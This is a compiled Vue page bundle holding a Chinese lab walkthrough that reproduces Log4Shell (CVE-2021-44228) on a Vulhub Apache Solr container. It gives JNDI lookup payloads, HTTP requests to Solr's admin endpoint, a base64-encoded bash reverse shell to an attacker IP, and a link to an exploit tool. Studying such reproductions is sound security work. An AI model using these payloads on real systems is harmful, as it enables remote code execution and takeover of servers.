import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as s,c as r,a as e,b as a,d as n,e as l}from"./app-58e4a7d6.js";const c={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,[a("Apache Log4j2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于"),e("code",null,"${jndi:ldap://evil.com/example}"),a("的lookup用于进行JNDI注入，执行任意代码。")],-1),h=e("p",null,[a("CVE-2021-44228常被称为"),e("code",null,"log4shell"),a("。")],-1),g=e("p",null,"参考链接：",-1),u={href:"https://logging.apache.org/log4j/2.x/security.html",target:"_blank",rel:"noopener noreferrer"},b={href:"https://www.lunasec.io/docs/blog/log4j-zero-day/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://xz.aliyun.com/t/10649",target:"_blank",rel:"noopener noreferrer"},v=e("p",null,"Payloads：",-1),_={href:"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Log4Shell.md",target:"_blank",rel:"noopener noreferrer"},f=l(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p><p>Vulhub执行如下命令启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问<code>http://your-ip:8983</code>即可查看到Apache Solr的后台页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p><code>\${jndi:ldap://\${sys:java.version}.example.com}</code>是利用JNDI发送DNS请求的Payload，我们将其作为管理员接口的action参数值发送如下数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /solr/admin/cores?action=\${jndi:ldap://\${sys:java.version}.example.com} HTTP/1.1
Host: your-ip:8983
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203052205527.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我们可以在DNS日志平台收到相关日志，显示出当前Java版本：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203052206769.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11),x={href:"https://github.com/welk1n/JNDI-Injection-Exploit",target:"_blank",rel:"noopener noreferrer"},k=l(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203052234596.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>利用完毕后，可见<code>touch /tmp/awesome_poc</code>已经成功被执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203052235135.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>构造反弹shell命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=}|{base64,-d}|{bash,-i}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203052235402.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>构造Payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /solr/admin/cores?action=\${jndi:ldap://192.168.174.128:1389/chof5b} HTTP/1.1
Host: your-ip:8983
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>监听9999端口，接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203052235323.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11);function y(A,j){const i=t("ExternalLinkIcon");return s(),r("div",null,[d,p,h,g,e("ul",null,[e("li",null,[e("a",u,[a("https://logging.apache.org/log4j/2.x/security.html"),n(i)])]),e("li",null,[e("a",b,[a("https://www.lunasec.io/docs/blog/log4j-zero-day/"),n(i)])]),e("li",null,[e("a",m,[a("https://xz.aliyun.com/t/10649"),n(i)])])]),v,e("ul",null,[e("li",null,[e("a",_,[a("https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE Exploits/Log4Shell.md"),n(i)])])]),f,e("p",null,[a("实际利用JNDI注入漏洞，可以使用"),e("a",x,[a("这个工具"),n(i)]),a("。")]),k])}const E=o(c,[["render",y],["__file","Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228.html.vue"]]);export{E as default};
